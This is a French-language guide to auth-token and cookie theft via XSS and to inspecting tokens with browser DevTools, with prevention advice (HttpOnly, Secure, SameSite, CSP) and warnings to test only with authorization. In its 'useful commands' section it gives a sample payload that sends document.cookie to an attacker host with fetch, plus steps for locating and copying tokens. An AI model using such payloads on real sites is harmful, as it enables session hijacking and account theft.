# Vol de `auth_token`, Cookies & Failles XSS : Guide Pratique

Ce document explique les risques liés au vol de tokens d'authentification, de cookies, et les failles XSS, ainsi que les outils/commandes pour les analyser via l'Inspector (DevTools).

---

## 1. Concepts Clés

### 🔑 **Vol de `auth_token`**
- **Qu'est-ce qu'un `auth_token`** ?  
  Un jeton (ex: JWT) utilisé pour authentifier un utilisateur sans renvoyer ses identifiants à chaque requête.
- **Où est-il stocké** ?  
  Souvent dans `localStorage`, `sessionStorage`, ou dans les **cookies**.
- **Attaques possibles** :  
  - Vol via XSS.  
  - Interception via MITM (Man-in-the-Middle).  

### 🍪 **Vol de Cookies**
- **Cookies sensibles** :  
  `session_id`, `token`, etc., avec des droits d'accès.
- **Risque principal** :  
  Si un cookie n'est pas marqué `HttpOnly`, il est accessible via JavaScript (`document.cookie`).

### 🎯 **XSS (Cross-Site Scripting)**
- **Définition** :  
  Injection de code JavaScript malveillant dans une page web, exécuté par les navigateurs des victimes.
- **Impact** :  
  Vol de cookies, redirection, modification du DOM, etc.

---

## 2. Utiliser l'Inspector (DevTools) pour Analyser

### 🔍 **Ouvrir l'Inspector**
- **Raccourci** : `F12` ou `Ctrl+Shift+I` (Windows) / `Cmd+Option+I` (Mac).

### 📝 **Onglet "Console"**
- **Vérifier l'accès aux cookies** :  
  ```javascript
  console.log(document.cookie); // Affiche les cookies NON marqués HttpOnly
Tester une XSS :

javascript
alert(document.cookie); // Si cela fonctionne, le site est vulnérable au XSS
📡 Onglet "Network"
Rafraîchissez la page.

Cliquez sur une requête HTTP (ex: /api/data).

Vérifiez les en-têtes (Headers) pour y trouver des tokens/cookies :

Authorization: Bearer <token>

Cookie: session_id=abc123

📂 Onglet "Application"
Cookies :
Affiche tous les cookies du domaine. Vérifiez les flags Secure, HttpOnly, et SameSite.

Local Storage / Session Storage :
Recherchez des tokens stockés ici (plus vulnérables que les cookies HttpOnly).

3. Commandes Utiles en Cas de Vulnérabilité
🛠 Exemple de Vol de Cookie via XSS
javascript
// Envoie les cookies de la victime à un serveur attaquant
fetch('https://attacker.com/steal?data=' + document.cookie);
🚨 Tester la Protection HttpOnly
Si document.cookie ne retourne pas un cookie sensible, il est marqué HttpOnly (sécurisé).

🔄 Modifier un Cookie (pour le test)
Dans l'onglet Application > Cookies, double-cliquez sur la valeur d'un cookie.

Modifiez-le et testez les droits d'accès (ex: session_id modifié).

4. Préventions
🛡 Contre le Vol de Tokens/Cookies
Cookies :

http
Set-Cookie: session_id=abc123; HttpOnly; Secure; SameSite=Strict
Tokens :
Ne pas les stocker dans localStorage (préférer les cookies HttpOnly).

🛑 Contre les XSS
Sanitize les entrées utilisateur avec des librairies comme DOMPurify.

Headers CSP (Content Security Policy) :

http
Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted.cdn.com
5. Conclusion
Vérifiez toujours où sont stockés les tokens/cookies.

Testez les flags HttpOnly/Secure via l'onglet Application.

Auditez les entrées utilisateur pour bloquer les XSS.

⚠️ Attention : Ces techniques doivent être utilisées uniquement à des fins de test autorisées.

trouver un auth_token via l'Inspector (Chrome DevTools) selon son emplacement de stockage :

1. Dans les Cookies
Étapes :
Ouvrez l'Inspector (F12 ou Ctrl+Shift+I).

Allez dans l'onglet Application > Cookies (dans le menu de gauche).

Sélectionnez le domaine du site actuel.

Cherchez un cookie nommé :

auth_token

token

jwt

session_token

Ou un nom personnalisé (ex: app_auth).

⚠️ Si le cookie est marqué HttpOnly :

Il n'est pas accessible via JavaScript (pas de document.cookie), mais peut être envoyé automatiquement dans les requêtes HTTP.

2. Dans le localStorage ou sessionStorage
Étapes :
Dans l'onglet Application, développez Local Storage ou Session Storage.

Sélectionnez le domaine du site.

Cherchez des clés comme :

authToken

userToken

access_token

jwtToken

🔍 Accéder via la Console :

javascript
console.log(localStorage.getItem('auth_token')); // Remplacez par la clé exacte
3. Dans les En-têtes HTTP (Headers)
Si le token est envoyé via l'en-tête Authorization (ex: Bearer <token>) :

Allez dans l'onglet Network.

Rafraîchissez la page ou déclenchez une action (ex: clic sur "Connexion").

Sélectionnez une requête API (ex: /api/user).

Dans les Headers de la requête, cherchez :

Authorization: Bearer eyJhbGciOi... (le token est après "Bearer ")

Ou un en-tête personnalisé comme X-Auth-Token.

4. Via la Console (Si le token est accessible en JS)
Exécutez ces commandes dans l'onglet Console :

javascript
// Lister tous les cookies non HttpOnly
console.log(document.cookie);

// Afficher le localStorage
console.log(localStorage);

// Afficher le sessionStorage
console.log(sessionStorage);

// Recherche ciblée (exemple)
console.log(localStorage.getItem('token'));
5. Cas Pratique : Token dans localStorage
Ouvrez Application > Local Storage > [Domaine].

Repérez une entrée comme :

json
{
  "user": "john",
  "auth_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
}
Copiez la valeur de auth_token.

🔒 Vérifications de Sécurité
Si le token est dans localStorage :
Il est vulnérable aux attaques XSS (un script peut le voler).

Si le token est dans un cookie :
Vérifiez les flags Secure, HttpOnly, et SameSite dans l'onglet Cookies.

⚠️ Attention
Ne partagez jamais un token trouvé (même en test).

Ces méthodes sont à utiliser uniquement en environnement autorisé (pentest éthique, debug de votre propre app).
